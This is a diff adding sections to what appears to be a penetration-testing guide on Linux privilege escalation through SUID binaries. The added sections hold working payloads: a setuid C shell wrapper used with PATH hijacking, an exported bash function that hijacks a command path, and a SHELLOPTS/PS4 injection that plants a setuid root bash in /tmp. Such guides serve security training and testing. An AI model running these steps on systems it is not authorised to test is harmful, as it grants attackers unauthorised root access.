@@ -618,7 +618,7 @@ ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 2. **Check Crontab**  
    View the system crontab:
    ```bash
-   $ cat /etc/crontab
+    cat /etc/crontab
    ```
    Example:
    ```
@@ -1148,19 +1148,173 @@ sudo less
 This technique can also be used if a **suid** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**.
 
 [Payload examples to execute.](payloads-to-execute.md)
+#### SUID binary without command path
 
-### SUID binary with command path
+- **Definition**: The PATH environment variable is a list of directories that the shell searches to find executable programs.
+- **Execution Behavior**: When a program attempts to execute another program using just its name (not the full path), the shell searches through the directories listed in PATH.
+- **User Control**: Users can modify their PATH variable to prioritize directories they have write access to, potentially leading to security vulnerabilities.
 
+***Finding Vulnerable Programs***
+
+1. **Identifying Executable Strings**:
+    
+    - Programs often have the names of other executables embedded as strings.
+    - Use the `strings` command to extract these strings from an executable:
+        
+        ```bash
+        strings /path/to/file
+        ```
+        
+2. **Tracing Executions**:
+    
+    - Use `strace` to monitor system calls made by a program:
+        
+        ```bash
+        strace -v -f -e execve <command> 2>&1 | grep exec
+        ```
+        
+    - Use `ltrace` to trace library calls:
+        
+        ```bash
+        ltrace <command>
+        ```
+        
+
+***Privilege Escalation Techniques***
+
+1. **Finding SUID/SGID Files**:
+    
+    - Identify files with SUID or SGID permissions that could be exploited:
+        
+        ```bash
+        find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+        ```
+        
+2. **Analyzing SUID Files**:
+    
+    - Run `strings` on the identified SUID file to find potential vulnerabilities:
+        
+        ```bash
+        strings /usr/local/bin/suid-env
+        ```
+        
+    - Look for commands that may be executed without full paths (e.g., `service apache2 start`).
+3. **Verifying with strace**:
+    
+    - Confirm the execution of vulnerable commands:
+        
+        ```bash
+        strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
+        ```
+        
+4. **Verifying with ltrace**:
+    
+    - Optionally, check for system calls:
+        
+        ```bash
+        ltrace /usr/local/bin/suid-env 2>&1 | grep service
+        ```
+        
+5. **Creating a Privilege Escalation Payload**:
+    
+    - Write a C program (`service.c`) to escalate privileges:
+        
+        ```c
+        #include <stdlib.h>
+        #include <unistd.h>
+        
+        int main() {
+            setuid(0);
+            system("/bin/bash -p");
+        }
+        ```
+        
+6. **Compiling the Payload**:
+    
+    - Compile the C program:
+        
+        ```bash
+        gcc -o service service.c
+        ```
+        
+7. **Executing the SUID File**:
+    
+    - Prepend the current directory to the PATH and execute the SUID file to gain root access:
+        
+        ```bash
+        PATH=.:$PATH /usr/local/bin/suid-env
+        ```
+        
+    - Verify root access:
+        
+        ```bash
+        id
+        >>> root 
+        ```
+
+### SUID binary with command path 
+
+#### SUID binary with command path (notably Bash <4.2-048)
 If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.
 
 For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
 
 ```bash
+#Run strings on the SUID file:
+strings /usr/local/bin/suid-file #/usr/sbin/service apache2 start *the file could be trying to run the /usr/sbin/service program.
+
+#We can verify this with strace
+strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service 
+
+# Verify the version of Bash is lower than 4.2-048:
+bash --version #GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
+<suid_file>
+rootshell>id 
+root
 ```
 
 Then, when you call the suid binary, this function will be executed
+
+### SUID binary (Abusing Shell Features Bash <4.4)
+
+Bash provides a debugging mode that can be activated using the `-x` command-line option or by setting the `SHELLOPTS` environment variable to include `xtrace`. Although `SHELLOPTS` is read-only by default, it can be modified using the `env` command. When debugging is enabled, Bash uses the `PS4` variable to display an additional prompt for debug statements, which can include commands that execute each time the prompt is shown.
+
+In scenarios involving SUID (Set User ID) files, if a SUID file executes another program via Bash (e.g., using `system()`), it can inherit environment variables, allowing the command to run with the privileges of the file owner. Notably, in Bash versions 4.4 and above, the `PS4` variable is not inherited by shells running as root.
+
+**Privilege Escalation Steps:**
+1. **Identify SUID/SGID Files:**
+   Use the command:
+   ```bash
+   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+   ```
+2. **Analyze the SUID File:**
+   Run `strings` on the identified SUID file to check for commands it may execute:
+   ```bash
+   strings /usr/local/bin/suid-env2
+   ```
+3. **Verify Execution with `strace`:**
+   Use `strace` to confirm the execution of a specific command:
+   ```bash
+   strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
+   ```
+4. **Optionally Use `ltrace`:**
+   Check for library calls with `ltrace`:
+   ```bash
+   ltrace /usr/local/bin/suid-env2 2>&1 | grep service
+   ```
+5. **Run the SUID File with Debugging:**
+   Execute the SUID file with Bash debugging enabled and set `PS4` to execute a payload:
+   ```bash
+   env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
+   ```
+6. **Gain Root Shell:**
+   Finally, run the newly created root shell:
+   ```bash
+   /tmp/rootbash -p
+   ```
 
 ### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 #### LD_PRELOAD
